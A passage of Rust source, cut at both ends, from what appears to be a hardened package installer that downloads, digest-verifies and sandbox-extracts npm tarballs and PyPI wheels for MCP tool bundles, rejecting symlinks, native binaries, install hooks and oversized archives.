        .trim_start_matches(' ');
    if s.is_empty() {
        return Ok(0);
    }
    usize::from_str_radix(s, 8).map_err(|_| "Malformed octal size in tar header".into())
}

fn parse_pax_records(data: &[u8]) -> (Option<String>, Option<usize>) {
    let mut path = None;
    let mut size = None;
    let mut i = 0usize;
    while i < data.len() {
        let Some(sp) = data[i..].iter().position(|b| *b == b' ') else {
            break;
        };
        let len_str = std::str::from_utf8(&data[i..i + sp]).unwrap_or("");
        let Ok(rec_len) = len_str.parse::<usize>() else {
            break;
        };
        if rec_len <= sp + 1 || i + rec_len > data.len() {
            break;
        }
        let body = &data[i + sp + 1..i + rec_len];
        let body = body.strip_suffix(b"\n").unwrap_or(body);
        if let Some((k, v)) = std::str::from_utf8(body)
            .ok()
            .and_then(|s| s.split_once('='))
        {
            if k == "path" {
                path = Some(v.to_owned());
            } else if k == "size"
                && let Ok(parsed) = v.parse::<usize>()
            {
                size = Some(parsed);
            }
        }
        i += rec_len;
    }
    (path, size)
}

fn iterate_tar<F>(tar: &[u8], mut on_entry: F) -> Result<(), String>
where
    F: FnMut(&str, u8, &[u8]) -> Result<(), String>,
{
    let mut off = 0usize;
    let mut pax_path: Option<String> = None;
    let mut pax_size: Option<usize> = None;
    let mut gnu_longname: Option<String> = None;

    while off + 512 <= tar.len() {
        let hdr = &tar[off..off + 512];
        off += 512;
        if hdr.iter().all(|b| *b == 0) {
            break;
        }
        // Verify checksum
        let expected = parse_octal(&hdr[148..156])?;
        let mut sum: usize = hdr.iter().enumerate().fold(0, |acc, (idx, &b)| {
            acc + if (148..156).contains(&idx) {
                b' ' as usize
            } else {
                b as usize
            }
        });
        if sum != expected {
            // Check signed checksum fallback occasionally seen in older tar tools
            let signed_sum: isize = hdr.iter().enumerate().fold(0, |acc, (idx, &b)| {
                acc + if (148..156).contains(&idx) {
                    b' ' as isize
                } else {
                    (b as i8) as isize
                }
            });
            sum = signed_sum.max(0) as usize;
            if sum != expected {
                return Err("Corrupt tar header checksum".into());
            }
        }
        let typeflag = hdr[156];
        let raw_size = parse_octal(&hdr[124..136])?;
        let size = pax_size.take().unwrap_or(raw_size);
        let padded = size.checked_add(511).ok_or("Tar member size overflow")? & !511;
        if off.checked_add(padded).is_none_or(|end| end > tar.len()) {
            return Err("Truncated tar entry payload".into());
        }
        let payload = &tar[off..off + size];
        off += padded;

        if typeflag == b'L' {
            let s = std::str::from_utf8(payload)
                .map_err(|_| "Invalid UTF-8 GNU longname")?
                .trim_end_matches('\0')
                .to_owned();
            gnu_longname = Some(s);
            continue;
        }
        if typeflag == b'x' {
            let (p, sz) = parse_pax_records(payload);
            if p.is_some() {
                pax_path = p;
            }
            if sz.is_some() {
                pax_size = sz;
            }
            continue;
        }
        if typeflag == b'g' || typeflag == b'K' || typeflag == b'V' {
            continue;
        }
        let name_field = hdr[0..100].split(|b| *b == 0).next().unwrap_or(&[]);
        let name_str = std::str::from_utf8(name_field).map_err(|_| "Non-UTF8 tar member name")?;
        let prefix_field = hdr[345..500].split(|b| *b == 0).next().unwrap_or(&[]);
        let prefix_str = std::str::from_utf8(prefix_field).map_err(|_| "Non-UTF8 tar prefix")?;
        let default_name = if prefix_str.is_empty() {
            name_str.to_owned()
        } else {
            format!("{prefix_str}/{name_str}")
        };
        let member_name = pax_path
            .take()
            .or_else(|| gnu_longname.take())
            .unwrap_or(default_name);

        on_entry(&member_name, typeflag, payload)?;
    }
    Ok(())
}

fn extract_tar_bytes_to_dir(
    tar: &[u8],
    dest_fd: &OwnedFd,
    strip_prefix: Option<&str>,
    budget: &mut ExtractBudget,
    reject_native_addons: bool,
) -> Result<(), String> {
    iterate_tar(tar, |name, typeflag, data| match typeflag {
        b'0' | 0 => {
            let Some(rel) = validate_rel_path(name, strip_prefix)? else {
                return Ok(());
            };
            if reject_native_addons
                && rel
                    .extension()
                    .and_then(OsStr::to_str)
                    .is_some_and(|ext| matches!(ext, "node" | "so" | "dylib" | "dll"))
            {
                return Err(format!(
                    "Unreviewed native binary extension rejected: {}",
                    rel.display()
                ));
            }
            budget.account(data.len())?;
            write_regular_beneath(dest_fd, &rel, data, false)?;
            Ok(())
        }
        b'5' => {
            if let Some(rel) = validate_rel_path(name, strip_prefix)? {
                ensure_dir_chain(dest_fd, &rel)
                    .map_err(|e| format!("Failed creating dir {}: {e}", rel.display()))?;
            }
            Ok(())
        }
        b'2' | b'1' => Err(format!(
            "Symlinks and hardlinks in archives are forbidden ({name})"
        )),
        _ => Err(format!(
            "Unsupported unsafe tar entry type '{typeflag}' for {name}"
        )),
    })
}

fn extract_zip_bytes_to_dir(
    zip_bytes: &[u8],
    dest_fd: &OwnedFd,
    budget: &mut ExtractBudget,
    reject_native_addons: bool,
) -> Result<(), String> {
    // Runs Python in strict isolated mode (-I -S) reading pre-SHA256-verified archive
    // bytes exclusively over stdin and streaming validated frames over stdout (no disk I/O).
    const PY_HELPER: &str = r#"
import io, stat, struct, sys, zipfile
raw = sys.stdin.buffer.read(100 * 1024 * 1024 + 1)
if len(raw) > 100 * 1024 * 1024:
    sys.exit("zip too large")
total = 0
count = 0
with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
    for info in zf.infolist():
        count += 1
        if count > 30000:
            sys.exit("too many zip entries")
        mode = (info.external_attr >> 16) & 0o170000
        if mode == stat.S_IFLNK or (mode not in (0, stat.S_IFREG, stat.S_IFDIR) and not info.is_dir()):
            sys.exit("forbidden zip entry type")
        if info.is_dir():
            continue
        if info.file_size > 50 * 1024 * 1024:
            sys.exit("zip member too large")
        with zf.open(info, "r") as member:
            data = member.read(50 * 1024 * 1024 + 1)
        if len(data) > 50 * 1024 * 1024:
            sys.exit("zip decompressed size exceeded")
        total += len(data)
        if total > 256 * 1024 * 1024:
            sys.exit("zip bomb guard triggered")
        p = info.filename.encode("utf-8")
        sys.stdout.buffer.write(struct.pack("<IQ", len(p), len(data)))
        sys.stdout.buffer.write(p)
        sys.stdout.buffer.write(data)
"#;
    let mut cmd = Command::new("/usr/bin/python3");
    cmd.env_clear()
        .args(["-I", "-S", "-c", PY_HELPER])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd
        .spawn()
        .map_err(|_| "Failed to start isolated ZIP reader (/usr/bin/python3)".to_owned())?;
    let mut stdin = child.stdin.take().ok_or("Missing python stdin")?;
    let owned = zip_bytes.to_vec();
    let writer = std::thread::spawn(move || stdin.write_all(&owned));
    let mut stdout = child.stdout.take().ok_or("Missing python stdout")?;
    let mut stderr = child.stderr.take();

    let mut parse_err: Option<String> = None;
    loop {
        let mut hdr = [0u8; 12];
        match stdout.read_exact(&mut hdr) {
            Ok(()) => {}
            Err(e) if e.kind() == io::ErrorKind::UnexpectedEof => break,
            Err(_) => {
                parse_err = Some("Failed reading ZIP frame stream".into());
                break;
            }
        }
        let plen = u32::from_le_bytes(hdr[0..4].try_into().unwrap()) as usize;
        let dlen = u64::from_le_bytes(hdr[4..12].try_into().unwrap()) as usize;
        if plen == 0 || plen > 2048 || dlen > MAX_SINGLE_FILE_BYTES {
            parse_err = Some("ZIP frame header exceeds safety bounds".into());
            break;
        }
        let mut pbuf = vec![0u8; plen];
        if stdout.read_exact(&mut pbuf).is_err() {
            parse_err = Some("Truncated ZIP path frame".into());
            break;
        }
        let Ok(raw_path) = std::str::from_utf8(&pbuf) else {
            parse_err = Some("Non-UTF8 ZIP member path".into());
            break;
        };
        let mut dbuf = vec![0u8; dlen];
        if stdout.read_exact(&mut dbuf).is_err() {
            parse_err = Some("Truncated ZIP payload frame".into());
            break;
        }
        if let Err(e) = (|| -> Result<(), String> {
            let Some(rel) = validate_rel_path(raw_path, None)? else {
                return Ok(());
            };
            if reject_native_addons
                && rel
                    .extension()
                    .and_then(OsStr::to_str)
                    .is_some_and(|ext| matches!(ext, "so" | "pyd" | "dll" | "dylib"))
            {
                return Err(format!(
                    "Native Python extension rejected: {}",
                    rel.display()
                ));
            }
            budget.account(dbuf.len())?;
            write_regular_beneath(dest_fd, &rel, &dbuf, false)?;
            Ok(())
        })() {
            parse_err = Some(e);
            break;
        }
    }
    let _ = writer.join();
    if parse_err.is_some() {
        let _ = child.kill();
    }
    let status = child.wait().map_err(|_| "Failed waiting for ZIP reader")?;
    if let Some(err) = parse_err {
        return Err(err);
    }
    if !status.success() {
        let mut err_buf = Vec::new();
        if let Some(se) = stderr.take() {
            let _ = se.take(512).read_to_end(&mut err_buf);
        }
        let msg = String::from_utf8_lossy(&err_buf).trim().to_owned();
        return Err(if msg.is_empty() {
            "Unsafe or invalid ZIP/wheel archive".into()
        } else {
            format!("Wheel extraction rejected: {msg}")
        });
    }
    Ok(())
}

fn ensure_private_dir(parent: &Path, name: &str) -> Result<PathBuf, String> {
    let dir = parent.join(name);
    match fs::symlink_metadata(&dir) {
        Ok(meta) => {
            if meta.file_type().is_symlink() || !meta.is_dir() {
                return Err(format!("Unsafe state entry at {}", dir.display()));
            }
            fs::set_permissions(&dir, fs::Permissions::from_mode(0o700))
                .map_err(|_| format!("Cannot secure {}", dir.display()))?;
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => {
            fs::create_dir(&dir).map_err(|_| format!("Cannot create {}", dir.display()))?;
            fs::set_permissions(&dir, fs::Permissions::from_mode(0o700))
                .map_err(|_| format!("Cannot secure {}", dir.display()))?;
        }
        Err(_) => return Err(format!("Cannot inspect {}", dir.display())),
    }
    Ok(dir)
}

fn state_root_of(config: &Path) -> Result<PathBuf, String> {
    config
        .parent()
        .map(Path::to_path_buf)
        .filter(|p| p.is_absolute())
        .ok_or_else(|| "Gateway configuration requires an absolute state directory".into())
}

fn write_private_json(dir: &Path, name: &str, value: &Value) -> Result<(), String> {
    let tmp = dir.join(format!(".tmp-{name}"));
    let dst = dir.join(name);
    let mut encoded = serde_json::to_vec_pretty(value).map_err(|_| "JSON encoding error")?;
    encoded.push(b'\n');
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(&tmp)
        .map_err(|_| format!("Cannot write {}", dst.display()))?;
    file.set_permissions(fs::Permissions::from_mode(0o600))
        .map_err(|_| "Cannot chmod receipt")?;
    file.write_all(&encoded)
        .and_then(|()| file.sync_all())
        .map_err(|_| "Cannot sync receipt")?;
    fs::rename(&tmp, &dst).map_err(|_| "Cannot commit receipt")?;
    Ok(())
}

pub(crate) fn list_receipts(config: &Path) -> Result<Vec<Value>, String> {
    let state_root = state_root_of(config)?;
    let installs_dir = state_root.join("upstream-installs");
    if !installs_dir.exists() {
        return Ok(Vec::new());
    }
    let mut out = Vec::new();
    let entries = fs::read_dir(&installs_dir).map_err(|_| "Cannot list upstream-installs")?;
    for entry in entries.flatten() {
        let name = entry.file_name();
        let Some(name_str) = name.to_str() else {
            continue;
        };
        if name_str.starts_with('.') || !name_str.ends_with(".json") {
            continue;
        }
        let Ok(raw) = fs::read(entry.path()) else {
            continue;
        };
        if let Ok(val) = serde_json::from_slice::<Value>(&raw) {
            out.push(val);
        }
    }
    out.sort_by(|a, b| a["id"].as_str().cmp(&b["id"].as_str()));
    Ok(out)
}

fn check_npm_no_hooks(pkg_json: &Value) -> Result<(), String> {
    if pkg_json["gypfile"] == true {
        return Err("NPM package requires native node-gyp compilation (unreviewed)".into());
    }
    if let Some(scripts) = pkg_json.get("scripts").and_then(Value::as_object) {
        for hook in ["preinstall", "install", "postinstall"] {
            if let Some(cmd) = scripts.get(hook).and_then(Value::as_str)
                && !cmd.trim().is_empty()
            {
                return Err(format!(
                    "NPM package declares '{hook}' lifecycle script which is forbidden"
                ));
            }
        }
    }
    Ok(())
}

fn pick_npm_bin_entrypoint(pkg_json: &Value, pkg_name: &str) -> Result<String, String> {
    if let Some(s) = pkg_json.get("bin").and_then(Value::as_str) {
        let clean = s.trim_start_matches("./").to_owned();
        if !clean.is_empty() && !clean.contains("..") {
            return Ok(clean);
        }
    }
    if let Some(map) = pkg_json.get("bin").and_then(Value::as_object) {
        let short = pkg_name.rsplit('/').next().unwrap_or(pkg_name);
        if let Some(s) = map.get(short).and_then(Value::as_str) {
            return Ok(s.trim_start_matches("./").to_owned());
        }
        if let Some(s) = map.values().find_map(Value::as_str) {
            return Ok(s.trim_start_matches("./").to_owned());
        }
    }
    if let Some(main) = pkg_json.get("main").and_then(Value::as_str) {
        return Ok(main.trim_start_matches("./").to_owned());
    }
    Err("NPM package exposes no JS executable entrypoint in package.json".into())
}

fn select_semver_version<'a>(
    versions: &'a serde_json::Map<String, Value>,
    range: &str,
) -> Option<&'a str> {
    let trimmed = range.trim();
    if let Some((key, _)) = versions.get_key_value(trimmed) {
        return Some(key.as_str());
    }
    // Clean semver resolver for pinned, ^, ~, >= ranges without external crates
    let parse_triple = |v: &str| -> Option<(u64, u64, u64)> {
        if v.contains('-') {
            return None;
        }
        let mut parts = v.split('.');
        let a = parts.next()?.parse::<u64>().ok()?;
        let b = parts.next()?.parse::<u64>().ok()?;
        let c = parts.next()?.parse::<u64>().ok()?;
        if parts.next().is_some() {
            return None;
        }
        Some((a, b, c))
    };
    let matches_req = |cand: (u64, u64, u64), req: &str| -> bool {
        let r = req.trim();
        if r.is_empty() || r == "*" || r.eq_ignore_ascii_case("latest") {
            return true;
        }
        if let Some(rest) = r.strip_prefix('^')
            && let Some(min) = parse_triple(rest.trim())
        {
            return if min.0 > 0 {
                cand >= min && cand.0 == min.0
            } else if min.1 > 0 {
                cand >= min && cand.0 == 0 && cand.1 == min.1
            } else {
                cand == min
            };
        }
        if let Some(rest) = r.strip_prefix('~')
            && let Some(min) = parse_triple(rest.trim())
        {
            return cand >= min && cand.0 == min.0 && cand.1 == min.1;
        }
        if let Some(rest) = r.strip_prefix(">=")
            && let Some(min) = parse_triple(rest.trim())
        {
            return cand >= min;
        }
        parse_triple(r).is_some_and(|exact| cand == exact)
    };

    let clauses: Vec<&str> = trimmed.split_whitespace().collect();
    versions
        .keys()
        .filter_map(|k| parse_triple(k).map(|t| (t, k.as_str())))
        .filter(|(t, _)| clauses.iter().all(|c| matches_req(*t, c)))
        .max_by_key(|(t, _)| *t)
        .map(|(_, k)| k)
}

fn npm_registry_base(req: &InstallRequest) -> Result<String, String> {
    match &req.registry_url {
        Some(url) => {
            let trimmed = url.trim_end_matches('/');
            validate_download_url(trimmed)?;
            Ok(trimmed.to_owned())
        }
        None => Ok("https://registry.npmjs.org".into()),
    }
}

fn pypi_registry_base(req: &InstallRequest) -> Result<String, String> {
    match &req.registry_url {
        Some(url) => {
            let trimmed = url.trim_end_matches('/');
            validate_download_url(trimmed)?;
            Ok(trimmed.to_owned())
        }
        None => Ok("https://pypi.org".into()),
    }
}

struct PreparedBundle {
    id: String,
    kind: ProviderKind,
    version: String,
    source_url: String,
    digest: String,
    command: String,
    args: Vec<String>,
    tool_families: Option<String>,
    provenance: Option<String>,
    is_skill: bool,
    skill_name: Option<String>,
    skill_document: Option<String>,
}

fn parse_req_kind_and_package(
    req: &InstallRequest,
    catalog_entry: Option<&Value>,
    recipe: Option<&VerifiedRecipe>,
) -> Result<(ProviderKind, Option<String>, String, Option<String>), String> {
    if let Some(r) = recipe {
        let ver = req
            .version
            .clone()
            .filter(|v| v == r.version)
            .unwrap_or_else(|| r.version.to_owned());
        if let Some(req_v) = &req.version
            && req_v != r.version
            && req.url.is_none()
            && req.registry_url.is_none()
        {
            return Err(format!(
                "Built-in verified recipe {} pins version {}",
                r.id, r.version
            ));
        }
        let source_pkg = r.package.map(str::to_owned);
        return Ok((
            r.kind,
            source_pkg,
            ver,
            r.default_families.map(str::to_owned),
        ));
    }
    if let Some(kind_s) = &req.kind {
        let kind = ProviderKind::parse(kind_s).ok_or("Unsupported provider type")?;
        let ver = req.version.clone().unwrap_or_else(|| {
            catalog_entry
                .and_then(|e| e["version"].as_str())
                .unwrap_or("1.0.0")
                .to_owned()
        });
        validate_version(&ver)?;
        let pkg = req
            .package
            .clone()
            .or_else(|| {
                catalog_entry
                    .and_then(|e| e["installation"]["source"].as_str())
                    .and_then(|s| {
                        s.strip_prefix("npm:")
                            .or_else(|| s.strip_prefix("pypi:"))
                            .and_then(|rest| rest.rsplit_once('@').map(|(p, _)| p.to_owned()))
                    })
            })
            .or_else(|| req.entrypoint.clone());
        return Ok((kind, pkg, ver, None));
    }
    if let Some(entry) = catalog_entry {
        let mech = entry["installation"]["mechanism"]
            .as_str()
            .unwrap_or_default();
        let src = entry["installation"]["source"].as_str().unwrap_or_default();
        let typ = entry["type"].as_str().unwrap_or_default();
        let ver = entry["version"].as_str().unwrap_or_default().to_owned();
        if typ == "skill" || mech == "git" {
            return Ok((ProviderKind::Skill, None, ver, None));
        }
        if mech == "npm"
            && let Some(rest) = src.strip_prefix("npm:")
            && let Some((pkg, pv)) = rest.rsplit_once('@')
        {
            return Ok((
                ProviderKind::Npm,
                Some(pkg.to_owned()),
                req.version.clone().unwrap_or_else(|| pv.to_owned()),
                None,
            ));
        }
        if mech == "pypi"
            && let Some(rest) = src.strip_prefix("pypi:")
            && let Some((pkg, pv)) = rest.rsplit_once('@')
        {
            return Ok((
                ProviderKind::Pypi,
                Some(pkg.to_owned()),
                req.version.clone().unwrap_or_else(|| pv.to_owned()),
                None,
            ));
        }
    }
    Err("Specify a valid marketplace entry ID or explicit provider type + URL + digest".into())
}

#[allow(clippy::too_many_arguments)]
fn stage_npm(
    id: &str,
    pkg_name: &str,
    version: &str,
    recipe: Option<&VerifiedRecipe>,
    req: &InstallRequest,
    staging_path: &Path,
    staging_fd: &OwnedFd,
    manager: Option<&MarketplaceManager>,
    op_id: &str,
    cancelled: &AtomicBool,
    child_pid: &AtomicI32,
    bytes_counter: &AtomicU64,
    total_counter: &AtomicU64,
) -> Result<PreparedBundle, String> {
    validate_npm_pkg_name(pkg_name)?;
    validate_version(version)?;

    let mut budget = ExtractBudget { files: 0, bytes: 0 };

    // Fast pinned-url path when direct tarball URL + integrity pin are known (e.g. REA or test tarball)
    let direct_url = req.url.as_deref().or_else(|| {
        recipe.and_then(|r| {
            if r.allow_bundled_only {
                Some(r.url)
            } else {
                None
            }
        })
    });
    let (tarball_url, expected_sri, expected_sha256, root_pkg_json, root_is_direct) =
        if let Some(u) = direct_url {
            let pin256 = req
                .sha256
                .clone()
                .or_else(|| recipe.and_then(|r| r.sha256.map(str::to_owned)));
            let pin512 = req
                .sha512
                .clone()
                .or_else(|| recipe.and_then(|r| r.sha512_sri.map(str::to_owned)));
            if pin256.is_none() && pin512.is_none() {
                return Err(
                    "Direct tarball URL requires an explicit sha256 or sha512 SRI digest".into(),
                );
            }
            (u.to_owned(), pin512, pin256, Value::Null, true)
        } else {
            let base = npm_registry_base(req)?;
            let encoded = pkg_name.replace('/', "%2f");
            if let Some(m) = manager {
                m.set_phase(
                    op_id,
                    "resolving",
                    format!("Resolving npm:{pkg_name}@{version}"),
                    None,
                );
            }
            let meta_bytes = fetch_bytes(
                &format!("{base}/{encoded}/{version}"),
                8 * 1024 * 1024,
                cancelled,
                child_pid,
                bytes_counter,
                total_counter,
            )?;
            let meta: Value = serde_json::from_slice(&meta_bytes)
                .map_err(|_| "Malformed npm package metadata")?;
            check_npm_no_hooks(&meta)?;
            let tarball = meta["dist"]["tarball"]
                .as_str()
                .ok_or("Missing npm dist.tarball")?
                .to_owned();
            let sri = req
                .sha512
                .clone()
                .or_else(|| recipe.and_then(|r| r.sha512_sri.map(str::to_owned)))
                .or_else(|| meta["dist"]["integrity"].as_str().map(str::to_owned));
            let sha256 = req.sha256.clone();
            if sri.is_none() && sha256.is_none() {
                return Err("NPM package metadata missing integrity hash".into());
            }
            (tarball, sri, sha256, meta, false)
        };

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "downloading",
            format!("Downloading {pkg_name}@{version}"),
            None,
        );
    }
    let root_tgz = fetch_bytes(
        &tarball_url,
        MAX_DOWNLOAD_BYTES,
        cancelled,
        child_pid,
        bytes_counter,
        total_counter,
    )?;
    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "verifying",
            format!("Verifying integrity of {pkg_name}@{version}"),
            None,
        );
    }
    let digest = verify_digest(
        &root_tgz,
        expected_sha256.as_deref(),
        expected_sri.as_deref(),
    )?;
    let root_tar = gunzip_bounded(&root_tgz)?;

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "staging",
            format!("Extracting {pkg_name}@{version}"),
            None,
        );
    }
    let reject_native = recipe.is_none();
    extract_tar_bytes_to_dir(
        &root_tar,
        staging_fd,
        Some("package"),
        &mut budget,
        reject_native,
    )?;

    // Parse staged package.json directly from disk to verify no hidden install hooks or find entrypoint
    let staged_pkg_json: Value = {
        let p = staging_path.join("package.json");
        let raw = fs::read(&p).map_err(|_| "Extracted npm tarball missing package.json")?;
        serde_json::from_slice(&raw).map_err(|_| "Invalid extracted package.json")?
    };
    check_npm_no_hooks(&staged_pkg_json)?;

    // Resolve unbundled runtime dependencies cleanly from registry when not self-contained
    let bundled_node_modules = staging_path.join("node_modules").is_dir();
    if !root_is_direct
        && let Some(deps) = staged_pkg_json
            .get("dependencies")
            .and_then(Value::as_object)
        && !deps.is_empty()
        && !bundled_node_modules
    {
        let base = npm_registry_base(req)?;
        let mut queue: VecDeque<(String, String)> = deps
            .iter()
            .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_owned())))
            .collect();
        let mut seen: BTreeSet<String> = BTreeSet::new();
        while let Some((dep_name, dep_range)) = queue.pop_front() {
            if !seen.insert(dep_name.clone()) {
                continue;
            }
            if seen.len() > MAX_NPM_PACKAGES {
                return Err("NPM dependency graph exceeds maximum package limit".into());
            }
            validate_npm_pkg_name(&dep_name)?;
            let enc = dep_name.replace('/', "%2f");
            let dep_doc_bytes = fetch_bytes(
                &format!("{base}/{enc}"),
                16 * 1024 * 1024,
                cancelled,
                child_pid,
                bytes_counter,
                total_counter,
            )?;
            let dep_doc: Value = serde_json::from_slice(&dep_doc_bytes)
                .map_err(|_| format!("Malformed npm registry metadata for {dep_name}"))?;
            let versions = dep_doc["versions"]
                .as_object()
                .ok_or_else(|| format!("Missing versions map for {dep_name}"))?;
            let chosen = select_semver_version(versions, &dep_range).ok_or_else(|| {
                format!("Cannot resolve safe version for {dep_name} ({dep_range})")
            })?;
            let ver_meta = &versions[chosen];
            check_npm_no_hooks(ver_meta)?;
            let dep_url = ver_meta["dist"]["tarball"]
                .as_str()
                .ok_or_else(|| format!("Missing tarball for {dep_name}@{chosen}"))?;
            let dep_sri = ver_meta["dist"]["integrity"]
                .as_str()
                .ok_or_else(|| format!("Missing integrity SRI for {dep_name}@{chosen}"))?;
            let dep_tgz = fetch_bytes(
                dep_url,
                MAX_DOWNLOAD_BYTES,
                cancelled,
                child_pid,
                bytes_counter,
                total_counter,
            )?;
            verify_sha512_sri(&dep_tgz, dep_sri)?;
            let dep_tar = gunzip_bounded(&dep_tgz)?;
            let rel_target = Path::new("node_modules").join(&dep_name);
            let dep_fd = ensure_dir_chain(staging_fd, &rel_target)
                .map_err(|_| format!("Failed creating node_modules dir for {dep_name}"))?;
            extract_tar_bytes_to_dir(&dep_tar, &dep_fd, Some("package"), &mut budget, true)?;
            if let Some(subdeps) = ver_meta.get("dependencies").and_then(Value::as_object) {
                for (sk, sv) in subdeps {
                    if let Some(sr) = sv.as_str()
                        && !seen.contains(sk)
                    {
                        queue.push_back((sk.clone(), sr.to_owned()));
                    }
                }
            }
        }
    }
    let _ = root_pkg_json;

    let entry_rel = req
        .entrypoint
        .clone()
        .or_else(|| recipe.map(|r| r.entrypoint.to_owned()))
        .map(Ok)
        .unwrap_or_else(|| pick_npm_bin_entrypoint(&staged_pkg_json, pkg_name))?;
    let entry_clean = validate_rel_path(&entry_rel, None)?.ok_or("Empty npm entrypoint")?;
    if !staging_path.join(&entry_clean).is_file() {
        return Err(format!(
            "NPM entrypoint {} missing in bundle",
            entry_clean.display()
        ));
    }

    let bundle_entry = format!("/upstream/bundle/{}", entry_clean.display());
    let (command, args, families) = if id == "rea" {
        let fam = match &req.tool_families {
            Some(f) => validate_rea_families(f)?,
            None => recipe
                .and_then(|r| r.default_families)
                .unwrap_or("artifact")
                .to_owned(),
        };
        let mut a = vec![
            format!("REA_MCP_TOOL_FAMILIES={fam}"),
            "/usr/bin/node".to_owned(),
            bundle_entry,
        ];
        if let Some(extra) = &req.args {
            a.extend(extra.iter().cloned());
        } else {
            a.push("mcp".to_owned());
        }
        ("/usr/bin/env".to_owned(), a, Some(fam))
    } else {
        let mut a = vec![bundle_entry];
        if let Some(extra) = &req.args {
            a.extend(extra.iter().cloned());
        }
        ("/usr/bin/node".to_owned(), a, None)
    };

    Ok(PreparedBundle {
        id: id.to_owned(),
        kind: ProviderKind::Npm,
        version: version.to_owned(),
        source_url: tarball_url,
        digest,
        command,
        args,
        tool_families: families,
        provenance: recipe.and_then(|r| r.attestation.map(str::to_owned)),
        is_skill: false,
        skill_name: None,
        skill_document: None,
    })
}

fn select_pure_python_wheel(urls: &[Value]) -> Option<(&str, &str, &str)> {
    for item in urls {
        if item["packagetype"].as_str() != Some("bdist_wheel") {
            continue;
        }
        let filename = item["filename"].as_str()?;
        if !filename.ends_with("-py3-none-any.whl") && !filename.ends_with("-py2.py3-none-any.whl")
        {
            continue;
        }
        let url = item["url"].as_str()?;
        let sha = item["digests"]["sha256"].as_str()?;
        return Some((filename, url, sha));
    }
    None
}

fn find_console_script(
    site_packages: &Path,
    preferred: Option<&str>,
) -> Result<(String, String), String> {
    if let Some(spec) = preferred
        && let Some((m, f)) = spec.split_once(':')
    {
        return Ok((m.trim().to_owned(), f.trim().to_owned()));
    }
    for entry in fs::read_dir(site_packages).map_err(|_| "Missing site-packages")? {
        let entry = entry.map_err(|_| "Cannot inspect site-packages")?;
        if !entry.file_name().to_string_lossy().ends_with(".dist-info") {
            continue;
        }
        let ep = entry.path().join("entry_points.txt");
        if let Ok(content) = fs::read_to_string(ep) {
            let mut in_console = false;
            for line in content.lines() {
                let line = line.trim();
                if line.starts_with('[') {
                    in_console = line == "[console_scripts]";
                    continue;
                }
                if in_console
                    && let Some((_, target)) = line.split_once('=')
                    && let Some((m, f)) = target.trim().split_once(':')
                {
                    let f = f.split_whitespace().next().unwrap_or(f).trim();
                    return Ok((m.trim().to_owned(), f.to_owned()));
                }
            }
        }
    }
    Err("Pure-Python wheel lacks a console_scripts MCP entrypoint".into())
}

#[allow(clippy::too_many_arguments)]
fn stage_pypi(
    id: &str,
    pkg_name: &str,
    version: &str,
    recipe: Option<&VerifiedRecipe>,
    req: &InstallRequest,
    staging_path: &Path,
    staging_fd: &OwnedFd,
    manager: Option<&MarketplaceManager>,
    op_id: &str,
    cancelled: &AtomicBool,
    child_pid: &AtomicI32,
    bytes_counter: &AtomicU64,
    total_counter: &AtomicU64,
) -> Result<PreparedBundle, String> {
    validate_pypi_pkg_name(pkg_name)?;
    validate_version(version)?;
    let base = pypi_registry_base(req)?;
    let mut budget = ExtractBudget { files: 0, bytes: 0 };
    let site_fd = ensure_dir_chain(staging_fd, Path::new("site-packages"))
        .map_err(|_| "Failed creating site-packages staging directory")?;

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "resolving",
            format!("Resolving pypi:{pkg_name}@{version}"),
            None,
        );
    }

    let mut queue: VecDeque<(String, Option<String>)> =
        VecDeque::from([(pkg_name.to_owned(), Some(version.to_owned()))]);
    let mut seen: BTreeSet<String> = BTreeSet::new();
    let mut primary_url = String::new();
    let mut primary_digest = String::new();
    let mut resolved_version = version.to_owned();

    while let Some((cur_pkg, cur_ver)) = queue.pop_front() {
        let norm = cur_pkg.to_ascii_lowercase().replace(['_', '.'], "-");
        if !seen.insert(norm.clone()) {
            continue;
        }
        if seen.len() > MAX_PYPI_PACKAGES {
            return Err("PyPI dependency closure exceeds limit".into());
        }
        validate_pypi_pkg_name(&cur_pkg)?;
        let meta_url = match &cur_ver {
            Some(v) => format!("{base}/pypi/{cur_pkg}/{v}/json"),
            None => format!("{base}/pypi/{cur_pkg}/json"),
        };
        let meta_bytes = fetch_bytes(
            &meta_url,
            8 * 1024 * 1024,
            cancelled,
            child_pid,
            bytes_counter,
            total_counter,
        )?;
        let meta: Value = serde_json::from_slice(&meta_bytes)
            .map_err(|_| format!("Malformed PyPI metadata for {cur_pkg}"))?;
        let actual_ver = meta["info"]["version"].as_str().unwrap_or("0").to_owned();
        if seen.len() == 1 {
            resolved_version = actual_ver.clone();
        }
        let urls = meta["urls"]
            .as_array()
            .ok_or_else(|| format!("PyPI metadata missing releases for {cur_pkg}"))?;
        let (_, whl_url, whl_sha) = select_pure_python_wheel(urls).ok_or_else(|| {
            format!("No pure-Python py3-none-any wheel available for {cur_pkg}@{actual_ver} (native extensions/sdist rejected)")
        })?;
        let expected_sha = if seen.len() == 1 {
            req.sha256.as_deref().unwrap_or(whl_sha)
        } else {
            whl_sha
        };
        if let Some(m) = manager {
            m.set_phase(
                op_id,
                "downloading",
                format!("Downloading {cur_pkg}@{actual_ver}"),
                None,
            );
        }
        let whl_bytes = fetch_bytes(
            whl_url,
            MAX_DOWNLOAD_BYTES,
            cancelled,
            child_pid,
            bytes_counter,
            total_counter,
        )?;
        let digest = verify_sha256_hex(&whl_bytes, expected_sha)?;
        if seen.len() == 1 {
            primary_url = whl_url.to_owned();
            primary_digest = digest;
        }
        if let Some(m) = manager {
            m.set_phase(
                op_id,
                "staging",
                format!("Extracting wheel {cur_pkg}@{actual_ver}"),
                None,
            );
        }
        extract_zip_bytes_to_dir(&whl_bytes, &site_fd, &mut budget, true)?;

        if let Some(reqs) = meta["info"]["requires_dist"].as_array() {
            for r in reqs {
                let Some(line) = r.as_str() else {
                    continue;
                };
                if line.contains(';') {
                    // Skip environment-conditional extras unless non-extra markers needed
                    continue;
                }
                let dep_name = line
